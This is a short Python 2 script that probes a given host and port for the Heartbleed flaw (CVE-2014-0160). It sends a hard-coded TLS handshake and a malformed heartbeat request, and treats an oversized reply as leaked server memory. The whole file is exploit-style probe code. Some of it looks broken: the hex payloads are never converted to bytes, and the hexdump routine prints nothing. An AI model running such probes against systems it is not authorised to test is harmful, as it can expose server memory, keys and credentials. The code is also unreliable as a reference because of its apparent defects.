#encoding:utf-8
try:
    import os
    import struct
    import socket
    import time
    import select
    import logging
    import binascii
    from optparse import OptionParser
except:
     os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')
 
hello = b'16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101'

hb = b'1803020003014000'

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)

 
def recvall(s, length, timeout=5):
    try:
        endtime = time.time() + timeout
        rdata = ''
        remain = length
        while remain > 0:
            rtime = endtime - time.time() 
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata
    except Exception as e:
        logging.info("[-] do not found heartbleed")
        os._exit(2)
 
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        
        return None, None, None
    return typ, ver, pay
 
def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False
 
        if typ == 24:
            hexdump(pay)
            if len(pay) > 3:
                return True
            else:
                return False
        if typ == 21:
            hexdump(pay)
            return False
 
def main(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    sys.stdout.flush()
    try:
        s.connect((ip, port))
    except :
        logging.info("[-] {} time out".format(ip))
        return 4
    
    sys.stdout.flush()
    s.send(hello)
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            logging.info("[-] {} do not found cve-2014-0160".format(ip))
            return 2
        if typ == 22 and ord(pay[0]) == 0x0E:
            break
    sys.stdout.flush()
    s.send(hb)
    if hit_hb(s):
        logging.info("[+] {} find cve-2014-0160".format(ip))
        return 1
    logging.info("[-] {} do not found cve-2014-0160".format(ip))
    return 2
 
if __name__ == '__main__':
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    get = main(ip,int(port))
    os._exit(get)
